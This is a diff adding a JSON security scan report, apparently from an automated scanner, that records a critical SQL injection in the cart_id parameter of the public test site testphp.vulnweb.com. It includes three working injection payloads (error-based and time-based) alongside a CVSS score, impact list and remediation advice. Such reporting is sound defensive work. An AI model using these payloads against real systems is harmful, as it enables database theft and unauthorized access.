@@ -1,0 +1,85 @@
+{
+  "type": "SQL Injection",
+  "severity": "Critical",
+
+  "scan_info": {
+    "scan_id": "SEC-2026-0001",
+    "scan_date": "2026-02-16",
+    "scanner": "SecuScan AI Engine v1.0",
+    "target_ip": "44.228.249.3",
+    "scan_duration": "32 seconds",
+    "status": "Completed"
+  },
+
+  "request": {
+    "url": "http://testphp.vulnweb.com/sendcommand.php",
+    "method": "POST",
+    "headers": {
+      "User-Agent": "Mozilla/5.0",
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "cookies": {
+      "sessionid": "abc123def456"
+    },
+    "data": "cart_id=1efa76810b7004576aa0365cd1ac702e&submitForm=place+a+command"
+  },
+
+  "evidence": {
+    "vulnerable_parameter": "cart_id",
+    "parameter_type": "POST",
+    "dbms": "MySQL >= 5.6",
+    "injection_techniques": [
+      "Boolean-based blind",
+      "Error-based",
+      "Time-based blind"
+    ],
+    "successful_payloads": [
+      "cart_id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+      "cart_id=1' AND GTID_SUBSET(CONCAT(0x717070,(SELECT user()),0x717170),1)--",
+      "cart_id=1' AND (SELECT SLEEP(5))--"
+    ],
+    "proof": "Server response time increased to 5 seconds confirming time-based injection."
+  },
+
+  "risk_analysis": {
+    "cvss_score": 9.8,
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "likelihood": "High",
+    "impact_level": "Severe"
+  },
+
+  "impact": [
+    "Attackers can dump the entire database.",
+    "Authentication mechanisms can be bypassed.",
+    "Sensitive user data may be exposed.",
+    "Database integrity can be compromised.",
+    "Remote attackers may gain administrative access."
+  ],
+
+  "affected_components": [
+    "Shopping cart module",
+    "Order processing system",
+    "User session handling"
+  ],
+
+  "recommendations": [
+    "Use prepared statements (parameterized queries).",
+    "Validate and sanitize all user inputs.",
+    "Implement server-side input filtering.",
+    "Deploy a Web Application Firewall (WAF).",
+    "Use ORM frameworks to avoid raw queries.",
+    "Apply least-privilege database permissions.",
+    "Enable error handling without exposing DB errors."
+  ],
+
+  "references": [
+    {
+      "title": "OWASP SQL Injection",
+      "url": "https://owasp.org/www-community/attacks/SQL_Injection"
+    },
+    {
+      "title": "CWE-89: SQL Injection",
+      "url": "https://cwe.mitre.org/data/definitions/89.html"
+    }
+  ]
+}
